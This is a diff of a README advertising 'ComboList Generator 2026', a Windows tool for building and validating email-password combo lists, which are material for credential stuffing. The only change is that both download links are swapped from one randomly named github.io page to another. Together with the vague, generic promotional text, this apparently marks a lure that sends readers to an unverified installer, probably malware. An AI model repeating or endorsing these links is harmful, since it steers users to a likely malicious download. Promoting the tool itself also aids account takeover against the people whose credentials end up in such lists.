@@ -2,7 +2,7 @@
 
 ComboList Generator 2026 Ultimate Suite is a robust Windows desktop application designed specifically for managing and creating combo lists with efficiency and ease. In 2026, this tool stands out as a reliable solution for users who need to handle large datasets of email-pass or username-password combinations, offering a suite of features that cover generation, parsing, validation, and more. Whether you're a data enthusiast or a professional, this software provides a user-friendly interface to streamline your workflow.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -58,7 +58,7 @@ The tool includes safety features such as automatic backup creation before proce
 
 To access the latest version of ComboList Generator 2026, visit the official download page. This ensures you have the most up-to-date features and security improvements.
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 For any issues, suggestions, or support requests, feel free to open an issue on the GitHub repository. Our team is committed to providing timely assistance.
 
